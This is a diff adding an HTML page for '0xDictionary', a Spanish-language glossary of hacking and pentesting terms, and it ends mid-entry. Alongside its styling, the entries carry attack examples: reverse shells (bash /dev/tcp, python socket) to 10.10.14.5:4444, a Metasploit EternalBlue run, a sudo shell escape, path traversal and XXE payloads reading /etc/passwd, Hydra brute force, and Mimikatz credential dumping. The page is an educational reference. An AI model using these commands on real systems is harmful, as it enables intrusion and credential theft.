@@ -1,0 +1,1554 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xDictionary - Diccionario Hacker</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0f0f23;
+            --bg-card: #1a1a2e;
+            --bg-hover: #252540;
+            --accent: #00e5ff;
+            --accent-dark: #00b8d4;
+            --accent-glow: rgba(0, 229, 255, 0.2);
+            --text-primary: #ffffff;
+            --text-secondary: #b0b0c8;
+            --text-muted: #6b6b8f;
+            --border: #2a2a45;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Animated background */
+        .bg-animation {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: 0;
+            opacity: 0.03;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(102, 126, 234, 0.5) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(0, 229, 255, 0.5) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(245, 87, 108, 0.5) 0%, transparent 50%);
+            background-size: 100% 100%;
+            animation: bgMove 20s ease infinite;
+        }
+
+        @keyframes bgMove {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.1) rotate(5deg); }
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header */
+        header {
+            text-align: center;
+            padding: 4rem 2rem 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .logo {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 4rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00e5ff 0%, #667eea 50%, #f5576c 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+            letter-spacing: -2px;
+        }
+
+        .tagline {
+            font-size: 1.125rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        /* Search and Filter Section */
+        .search-section {
+            max-width: 800px;
+            margin: 0 auto 4rem;
+            display: flex;
+            gap: 1rem;
+            align-items: stretch;
+        }
+
+        .search-wrapper {
+            flex: 1;
+            position: relative;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 1.25rem 1.5rem 1.25rem 3.5rem;
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-family: 'DM Sans', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .search-input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 4px var(--accent-glow);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 1.25rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.5rem;
+            color: var(--text-muted);
+        }
+
+        .filter-btn {
+            padding: 1.25rem 2rem;
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .filter-btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent);
+        }
+
+        .filter-btn.active {
+            border-color: var(--accent);
+            background: var(--bg-hover);
+        }
+
+        .filter-count {
+            background: var(--accent);
+            color: var(--bg-dark);
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 0.25rem 0.5rem;
+            border-radius: 12px;
+            min-width: 20px;
+            text-align: center;
+        }
+
+        /* Filter Dropdown */
+        .filter-dropdown {
+            position: absolute;
+            top: calc(100% + 0.5rem);
+            right: 0;
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            min-width: 320px;
+            max-height: 400px;
+            overflow-y: auto;
+            display: none;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            z-index: 100;
+        }
+
+        .filter-dropdown.active {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .filter-dropdown h3 {
+            font-size: 0.875rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+
+        .tags-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .tag-option {
+            padding: 0.5rem 1rem;
+            background: var(--bg-dark);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+
+        .tag-option:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            transform: translateY(-2px);
+        }
+
+        .tag-option.selected {
+            background: var(--accent);
+            border-color: var(--accent);
+            color: var(--bg-dark);
+        }
+
+        /* Alphabet Navigation */
+        .alphabet-section {
+            margin-bottom: 3rem;
+        }
+
+        .letter-group {
+            margin-bottom: 4rem;
+        }
+
+        .letter-header {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 3rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.5rem;
+            display: inline-block;
+        }
+
+        /* Terms Grid */
+        .terms-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .term-card {
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 20px;
+            padding: 2rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .term-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.3s ease;
+        }
+
+        .term-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .term-card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .term-header {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .term-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .term-category-badge {
+            padding: 0.375rem 0.875rem;
+            border-radius: 8px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+
+        .category-web { background: rgba(102, 126, 234, 0.2); color: #667eea; }
+        .category-herramientas { background: rgba(0, 229, 255, 0.2); color: #00e5ff; }
+        .category-técnicas { background: rgba(245, 87, 108, 0.2); color: #f5576c; }
+        .category-reconocimiento { background: rgba(240, 147, 251, 0.2); color: #f093fb; }
+        .category-defensivas { background: rgba(79, 172, 254, 0.2); color: #4facfe; }
+        .category-conceptos { background: rgba(118, 75, 162, 0.2); color: #764ba2; }
+        .category-social-engineering { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
+        .category-malware { background: rgba(255, 159, 67, 0.2); color: #ff9f43; }
+        .category-metodologías { background: rgba(46, 213, 115, 0.2); color: #2ed573; }
+        .category-ataques { background: rgba(255, 71, 87, 0.2); color: #ff4757; }
+        .category-criptografía { background: rgba(87, 96, 111, 0.2); color: #57606f; }
+        .category-redes { background: rgba(30, 144, 255, 0.2); color: #1e90ff; }
+        .category-vulnerabilidad { background: rgba(251, 252, 253, 0.866); color: #6f7174; }
+
+        .term-definition {
+            color: var(--text-secondary);
+            font-size: 0.9375rem;
+            line-height: 1.7;
+            margin-bottom: 1.25rem;
+        }
+
+        .term-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .tag {
+            padding: 0.375rem 0.75rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 6px;
+            font-size: 0.8125rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            overflow-y: auto;
+            padding: 2rem 1rem;
+        }
+
+        .modal.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: var(--bg-card);
+            border: 2px solid var(--border);
+            border-radius: 24px;
+            max-width: 900px;
+            width: 100%;
+            padding: 3rem;
+            position: relative;
+            animation: slideUp 0.4s ease;
+            margin: 2rem auto;
+            min-height: auto;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1.5rem;
+            right: 1.5rem;
+            background: var(--accent);
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            color: var(--bg-dark);
+            font-size: 2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            line-height: 1;
+        }
+
+        .modal-close:hover {
+            background: #f5576c;
+            transform: scale(1.1);
+        }
+
+        .modal-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+            padding-right: 60px;
+        }
+
+        .modal-section {
+            margin-bottom: 2.5rem;
+        }
+
+        .modal-section h3 {
+            color: var(--accent);
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .modal-section p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            font-size: 1rem;
+        }
+
+        .info-box {
+            background: var(--bg-dark);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .info-box h3 {
+            color: var(--accent);
+            font-size: 1rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            font-family: 'Space Grotesk', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .info-box p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            font-size: 0.9375rem;
+            margin: 0;
+        }
+
+        .info-box .code-block {
+            margin: 0;
+        }
+
+        .code-block {
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+
+        .code-block code {
+            color: var(--accent);
+            font-size: 0.9rem;
+            line-height: 1.6;
+            white-space: pre-wrap;
+        }
+
+        .no-results {
+            text-align: center;
+            padding: 6rem 2rem;
+            color: var(--text-muted);
+        }
+
+        .no-results-icon {
+            font-size: 5rem;
+            margin-bottom: 1.5rem;
+            opacity: 0.3;
+        }
+
+        .no-results h3 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        footer {
+            text-align: center;
+            padding: 4rem 2rem;
+            color: var(--text-muted);
+            font-size: 0.875rem;
+            margin-top: 4rem;
+            border-top: 1px solid var(--border);
+        }
+
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2.5rem;
+            }
+
+            .search-section {
+                flex-direction: column;
+            }
+
+            .filter-dropdown {
+                right: 0;
+                left: 0;
+                min-width: auto;
+            }
+
+            .terms-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .letter-header {
+                font-size: 2rem;
+            }
+
+            .modal {
+                padding: 1rem;
+            }
+
+            .modal-content {
+                padding: 2rem;
+                margin: 1rem auto;
+            }
+
+            .modal-title {
+                font-size: 2rem;
+                padding-right: 50px;
+            }
+
+            .modal-close {
+                top: 1rem;
+                right: 1rem;
+                width: 45px;
+                height: 45px;
+            }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+
+    <header>
+        <div class="logo">0xDictionary</div>
+        <div class="tagline">El diccionario definitivo para hackers y pentesters</div>
+    </header>
+
+    <div class="container">
+        <!-- Search & Filter -->
+        <div class="search-section">
+            <div class="search-wrapper">
+                <span class="search-icon">🔍</span>
+                <input 
+                    type="text" 
+                    id="searchInput" 
+                    class="search-input" 
+                    placeholder="Buscar términos, técnicas, herramientas..."
+                >
+            </div>
+            
+            <div style="position: relative;">
+                <button class="filter-btn" id="filterBtn">
+                    <span>Filtros</span>
+                    <span class="filter-count" id="filterCount" style="display: none;">0</span>
+                </button>
+                
+                <div class="filter-dropdown" id="filterDropdown">
+                    <h3>Categorías</h3>
+                    <div class="tags-grid" id="tagsGrid"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Alphabet Content -->
+        <div id="contentContainer"></div>
+    </div>
+
+    <footer>
+        <p>0xDictionary - Construido para la comunidad hacker 🔓</p>
+        <p style="margin-top: 0.5rem;">Open source • Educativo • Sin censura</p>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal" id="termModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">×</button>
+            <div id="modalBody"></div>
+        </div>
+    </div>
+
+    <script>
+        // Base de datos de términos (con escapado correcto)
+        const terms = [
+            {
+                title: "Nmap",
+                slug: "nmap",
+                category: "Herramientas",
+                tags: ["herramientas", "redes", "escaneo", "reconocimiento"],
+                definition: "Network Mapper - Herramienta de código abierto para exploración de redes y auditorías de seguridad.",
+                explanation: "Permite descubrir hosts activos en una red, identificar puertos abiertos, determinar servicios y versiones en ejecución, y detectar sistemas operativos. Utiliza diversos tipos de escaneo (TCP SYN, TCP Connect, UDP, etc.) y puede ejecutar scripts NSE (Nmap Scripting Engine) para detección de vulnerabilidades específicas. Es la herramienta estándar para la fase de reconocimiento en pentesting.",
+                example: `nmap -sS -sV -O 192.168.1.0/24
+nmap -p- --min-rate 10000 target.com
+nmap --script vuln target.com`,
+                importance: "Fundamental en cualquier auditoría de seguridad, permite mapear la superficie de ataque y es el primer paso en la mayoría de pruebas de penetración. Su versatilidad y precisión la hacen indispensable."
+            },
+            {
+                title: "Burp Suite",
+                slug: "burp-suite",
+                category: "Herramientas",
+                tags: ["herramientas", "web", "proxy", "testing"],
+                definition: "Plataforma integrada para realizar pruebas de seguridad en aplicaciones web.",
+                explanation: "Funciona como un proxy interceptor que permite analizar y modificar el tráfico HTTP/HTTPS entre el navegador y el servidor. Incluye módulos como Spider (rastreo automático), Scanner (detección de vulnerabilidades), Intruder (ataques automatizados), Repeater (modificación manual de peticiones) y Decoder/Comparer para análisis de datos. La versión Professional añade escaneo automático avanzado.",
+                example: `1. Configura proxy en navegador (127.0.0.1:8080)
+2. Intercepta petición en Proxy > Intercept
+3. Send to Repeater para modificar
+4. Send to Intruder para fuzzing`,
+                importance: "Es el estándar de facto en pentesting web. Permite identificar y explotar la mayoría de vulnerabilidades web de forma eficiente, tanto manual como automatizada."
+            },
+            {
+                title: "Metasploit",
+                slug: "metasploit",
+                category: "Herramientas",
+                tags: ["herramientas", "explotación", "framework", "pentesting"],
+                definition: "Framework de penetración que proporciona información sobre vulnerabilidades y facilita el desarrollo y ejecución de exploits.",
+                explanation: "Incluye una extensa base de datos de exploits públicos, payloads, encoders y módulos auxiliares. Permite automatizar muchas fases del pentesting, desde reconocimiento hasta post-explotación. Utiliza un lenguaje de módulos en Ruby y ofrece interfaces tanto CLI (msfconsole) como GUI. Integra herramientas como meterpreter, un payload avanzado que permite control completo del sistema comprometido.",
+                example: `msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit`,
+                importance: "Acelera dramáticamente el proceso de explotación y es esencial para validar la criticidad real de las vulnerabilidades encontradas. Su biblioteca de exploits se actualiza constantemente."
+            },
+            {
+                title: "Reverse Shell",
+                slug: "reverse-shell",
+                category: "Técnicas",
+                tags: ["técnicas", "explotación", "persistencia"],
+                definition: "Conexión shell inversa donde la máquina comprometida se conecta de vuelta al atacante.",
+                explanation: "A diferencia de un bind shell (que abre un puerto en la víctima), la reverse shell hace que la víctima inicie la conexión hacia el atacante. Esto es útil para evadir firewalls, ya que las conexiones salientes suelen estar menos restringidas. Se puede implementar en múltiples lenguajes (bash, python, netcat, powershell) y es una de las técnicas más comunes en post-explotación.",
+                example: `# Atacante escucha
+nc -lvnp 4444
+
+# Víctima se conecta (bash)
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);'`,
+                importance: "Proporciona acceso remoto al sistema comprometido de forma sigilosa. Es el objetivo común tras explotar una vulnerabilidad inicial y permite ejecutar comandos, subir archivos y mantener persistencia."
+            },
+            {
+                title: "Privilege Escalation",
+                slug: "privilege-escalation",
+                category: "Técnicas",
+                tags: ["técnicas", "explotación", "linux", "windows"],
+                definition: "Proceso de obtener privilegios superiores a los inicialmente otorgados en un sistema comprometido.",
+                explanation: "Tras obtener acceso inicial (usualmente como usuario de bajos privilegios), el objetivo es escalar a root/SYSTEM. Las técnicas incluyen: explotación de kernel vulnerables, binarios SUID mal configurados, tareas programadas inseguras, credenciales hardcodeadas, permisos de sudo incorrectos, y servicios mal configurados. Herramientas como LinPEAS, WinPEAS automatizan la búsqueda de vectores de escalación.",
+                example: `# Buscar binarios SUID
+find / -perm -4000 2>/dev/null
+
+# Sudo mal configurado
+sudo -l
+sudo /usr/bin/vim -c ':!/bin/sh'
+
+# Kernel exploit
+uname -a
+searchsploit linux kernel 4.4.0`,
+                importance: "Convertir un acceso limitado en control total del sistema es crucial para la exfiltración de datos sensibles, instalación de backdoors persistentes y movimiento lateral en la red."
+            },
+            {
+                title: "Directory Traversal",
+                slug: "directory-traversal",
+                category: "Web",
+                tags: ["web", "vulnerabilidad", "file-inclusion"],
+                definition: "Vulnerabilidad que permite acceder a archivos y directorios fuera del directorio raíz del servidor web.",
+                explanation: "También conocido como Path Traversal, explota la falta de validación en rutas de archivos. Usando secuencias como '../' (dot-dot-slash), un atacante puede navegar hacia arriba en la estructura de directorios y acceder a archivos sensibles del sistema como /etc/passwd, configuraciones de aplicaciones, archivos de log, o código fuente. Las variantes incluyen codificación URL, Unicode, y doble codificación para evadir filtros.",
+                example: `https://ejemplo.com/archivo?path=../../../../etc/passwd
+
+# URL encoded
+..%2f..%2f..%2fetc%2fpasswd
+
+# Double encoded
+..%252f..%252f..%252fetc%252fpasswd`,
+                importance: "Puede exponer información crítica del sistema, credenciales, código fuente, y claves privadas. En combinación con otras vulnerabilidades, puede llevar a RCE (Remote Code Execution)."
+            },
+            {
+                title: "2FA",
+                slug: "2fa",
+                category: "Defensivas",
+                tags: ["defensivas", "autenticación", "seguridad"],
+                definition: "Two-Factor Authentication - Método de autenticación que requiere dos factores diferentes para verificar la identidad del usuario.",
+                explanation: "Combina algo que sabes (contraseña) con algo que tienes (dispositivo físico, app de autenticación) o algo que eres (biometría). Los métodos comunes incluyen: TOTP (Time-based One-Time Password como Google Authenticator), SMS (menos seguro), hardware tokens (YubiKey), y notificaciones push. Mitiga ataques de phishing y robo de credenciales, aunque métodos como SMS son vulnerables a SIM swapping.",
+                example: `# Configurar TOTP
+1. Escanear QR code con Google Authenticator
+2. Introducir código de 6 dígitos
+3. Guardar códigos de backup
+
+# Bypass común: Session fixation, OAuth misconfiguration`,
+                importance: "Reduce drásticamente el riesgo de compromiso de cuentas. Incluso si se roban las credenciales, el atacante necesita el segundo factor. Es una defensa fundamental recomendada para todos los servicios críticos."
+            },
+            {
+                title: "0day",
+                slug: "0day",
+                category: "Conceptos",
+                tags: ["conceptos", "vulnerabilidad", "exploits"],
+                definition: "Vulnerabilidad desconocida públicamente y sin parche disponible, o exploit usado antes de que exista una solución.",
+                explanation: "El término 'día cero' se refiere a que los desarrolladores tienen cero días para corregir la vulnerabilidad antes de que sea explotada. Son extremadamente valiosas en el mercado negro y clandestino (pueden venderse por millones de dólares). Los exploits 0day son utilizados por APTs (Advanced Persistent Threats), agencias gubernamentales y cibercriminales sofisticados.",
+                example: `Ejemplos históricos:
+- EternalBlue (NSA, usado en WannaCry)
+- Stuxnet (múltiples 0days contra SCADA)
+- Pegasus (0days de iOS/Android)
+
+Mercado: $100k - $5M dependiendo del objetivo`,
+                importance: "Representan el nivel más alto de amenaza porque no existe defensa directa. Las organizaciones solo pueden mitigarse con defensa en profundidad, detección de anomalías y respuesta rápida a incidentes."
+            },
+            {
+                title: "Phishing",
+                slug: "phishing",
+                category: "Social Engineering",
+                tags: ["social-engineering", "ataque", "credenciales"],
+                definition: "Técnica de ingeniería social que busca engañar a las víctimas para que revelen información sensible o ejecuten acciones maliciosas.",
+                explanation: "Típicamente mediante correos electrónicos, SMS (smishing) o llamadas (vishing) que se hacen pasar por entidades legítimas. Los ataques van desde campañas masivas genéricas hasta spear phishing (dirigido a individuos específicos) y whaling (dirigido a ejecutivos). Técnicas avanzadas incluyen clonación de sitios, uso de dominios similares (typosquatting), y abuso de servicios legítimos para hosting.",
+                example: `Correo falso:
+De: seguridad@banc0.com (nota el cero)
+Asunto: Suspensión de cuenta - Acción requerida
+
+Sitio clonado:
+https://login-microsoft.com.secure-verify.tk`,
+                importance: "Sigue siendo uno de los vectores de ataque más efectivos (>90% de brechas comienzan con phishing). Requiere poca habilidad técnica pero gran habilidad social. Es la puerta de entrada común para ransomware y APTs."
+            },
+            {
+                title: "OSINT",
+                slug: "osint",
+                category: "Reconocimiento",
+                tags: ["reconocimiento", "inteligencia", "pasivo"],
+                definition: "Open Source Intelligence - Recopilación de información a partir de fuentes públicamente disponibles.",
+                explanation: "Incluye búsqueda en motores, redes sociales, bases de datos públicas, registros DNS/WHOIS, GitHub, paste sites, certificados SSL, y más. Herramientas como theHarvester, Maltego, Shodan, y Recon-ng automatizan este proceso. Es una fase crítica de reconocimiento pasivo que no genera tráfico hacia el objetivo, minimizando el riesgo de detección.",
+                example: `# theHarvester
+theHarvester -d ejemplo.com -b all
+
+# Shodan
+shodan search org:"Empresa Target"
+
+# Google Dorking
+site:ejemplo.com filetype:pdf`,
+                importance: "Proporciona información valiosa sin alertar al objetivo: empleados, tecnologías usadas, infraestructura, filtraciones de datos previas, superficie de ataque externa. Es legal y ético en la mayoría de contextos."
+            },
+            {
+                title: "Lateral Movement",
+                slug: "lateral-movement",
+                category: "Técnicas",
+                tags: ["técnicas", "post-explotación", "redes"],
+                definition: "Técnicas para moverse entre sistemas dentro de una red después de la compromisión inicial.",
+                explanation: "Tras comprometer un sistema, los atacantes pivotan hacia otros hosts para alcanzar objetivos de alto valor. Técnicas comunes: Pass-the-Hash, Pass-the-Ticket (Kerberos), abuso de SMB/WMI/PsExec, uso de credenciales robadas, y explotación de confianzas entre sistemas. Herramientas como Mimikatz, CrackMapExec e Impacket facilitan este movimiento.",
+                example: `# Pass-the-Hash con CrackMapExec
+crackmapexec smb 192.168.1.0/24 -u Administrator -H <HASH>
+
+# PsExec
+psexec.py DOMAIN/user@target cmd.exe
+
+# Mimikatz
+mimikatz.exe "sekurlsa::logonpasswords"`,
+                importance: "Es cómo los atacantes van desde un punto de entrada de bajo valor hasta los sistemas críticos (Domain Controllers, bases de datos, sistemas financieros). Esencial tanto para atacantes como para Red Teams."
+            },
+            {
+                title: "Wireshark",
+                slug: "wireshark",
+                category: "Herramientas",
+                tags: ["herramientas", "redes", "análisis", "forense"],
+                definition: "Analizador de protocolos de red open source que permite capturar y examinar tráfico de red en detalle.",
+                explanation: "Funciona capturando paquetes de red en tiempo real y permitiendo inspección profunda de cientos de protocolos. Útil para análisis forense, troubleshooting de red, detección de malware, análisis de tráfico cifrado (con claves), y debugging de aplicaciones de red. Soporta filtros complejos (BPF y display filters) para aislar tráfico específico.",
+                example: `# Capturar tráfico HTTP
+http.request.method == "POST"
+
+# Ver credenciales en claro
+http contains "password"
+
+# Filtrar por IP
+ip.addr == 192.168.1.100`,
+                importance: "Fundamental para entender comunicaciones de red, identificar tráfico malicioso, extraer archivos transferidos, y analizar protocolos propietarios. Es indispensable en análisis forense y respuesta a incidentes."
+            },
+            {
+                title: "John the Ripper",
+                slug: "john-the-ripper",
+                category: "Herramientas",
+                tags: ["herramientas", "cracking", "password"],
+                definition: "Herramienta de auditoría de contraseñas y cracking de hashes extremadamente versátil y rápida.",
+                explanation: "Soporta cientos de formatos de hash (MD5, SHA, bcrypt, NTLM, etc.) y tipos de cifrado. Incluye modos de ataque: diccionario, fuerza bruta, incremental, y reglas para mutación de palabras. La versión community (Jumbo) añade soporte para formatos adicionales. Puede aprovechar GPU para acelerar dramáticamente el cracking.",
+                example: `# Crack de archivo /etc/shadow
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john --wordlist=rockyou.txt hashes.txt
+
+# Usar reglas
+john --wordlist=dict.txt --rules hashes.txt`,
+                importance: "Las contraseñas débiles son una de las principales vulnerabilidades. John permite auditar la fortaleza de contraseñas en una organización y es esencial para completar la cadena de ataque tras obtener hashes."
+            },
+            {
+                title: "Hydra",
+                slug: "hydra",
+                category: "Herramientas",
+                tags: ["herramientas", "bruteforce", "password", "redes"],
+                definition: "Herramienta de ataque de fuerza bruta para credenciales en servicios de red.",
+                explanation: "Soporta más de 50 protocolos incluyendo SSH, FTP, HTTP(S), SMB, RDP, SMTP, MySQL, PostgreSQL, etc. Permite ataques con diccionarios, combinaciones de usuarios/contraseñas, y puede realizar ataques paralelos para mayor velocidad. Es altamente configurable en términos de número de threads, timeouts, y condiciones de éxito/fallo.",
+                example: `# SSH bruteforce
+hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+# HTTP POST form
+hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`,
+                importance: "Las credenciales por defecto y contraseñas débiles siguen siendo una puerta de entrada común. Hydra permite identificar rápidamente estos casos en auditorías de seguridad y pruebas de penetración."
+            },
+            {
+                title: "XXE",
+                slug: "xxe",
+                category: "Web",
+                tags: ["web", "vulnerabilidad", "xml", "injection"],
+                definition: "XML External Entity - Vulnerabilidad que permite a un atacante interferir con el procesamiento de datos XML de una aplicación.",
+                explanation: "Ocurre cuando un parser XML mal configurado procesa entidades externas definidas en el documento XML. Esto puede permitir: lectura de archivos locales del servidor, SSRF (Server-Side Request Forgery) para escanear redes internas, DoS mediante billion laughs attack, y en casos extremos RCE. La explotación se basa en definir entidades XML que el parser expandirá.",
+                example: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>
+
+<!-- SSRF -->
+<!ENTITY xxe SYSTEM "http://interno.local/secret">`,
+                importance: "Puede exponer archivos críticos del sistema, código fuente, configuraciones, y credenciales. El SSRF resultante puede comprometer redes internas completas. Aparece en APIs que procesan XML, SAML, y formatos basados en XML."
+            },
+            {
+                title: "IDOR",
+                slug: "idor",
+                category: "Web",
+                tags: ["web", "vulnerabilidad", "access-control"],
+                definition: "Insecure Direct Object Reference - Fallo en el control de acceso que permite acceder a objetos de otros usuarios modificando identificadores.",
+                explanation: "Sucede cuando una aplicación expone referencias directas a objetos internos (IDs de usuario, archivos, documentos) sin verificar que el usuario tiene permiso para acceder a ellos. Al cambiar parámetros como user_id=123 a user_id=124, un atacante puede acceder a recursos de otros usuarios. Es común en APIs REST y endpoints que usan IDs secuenciales.",
+                example: `# Acceso a factura
+GET /api/invoice/1234 → Tu factura
+GET /api/invoice/1235 → IDOR: Factura de otro
+
+# Modificación de perfil
+POST /user/update
+{"user_id": 999, "role": "admin"}`,
+                importance: "Una de las vulnerabilidades más comunes en aplicaciones modernas. Puede resultar en acceso no autorizado a datos sensibles, modificación de información de otros usuarios, o escalación de privilegios horizontal/vertical."
+            },
+            {
+                title: "SSRF",
+                slug: "ssrf",
+                category: "Web",
+                tags: ["web", "vulnerabilidad", "redes"],
+                definition: "Server-Side Request Forgery - Vulnerabilidad que permite a un atacante hacer que el servidor realice peticiones HTTP a destinos arbitrarios.",
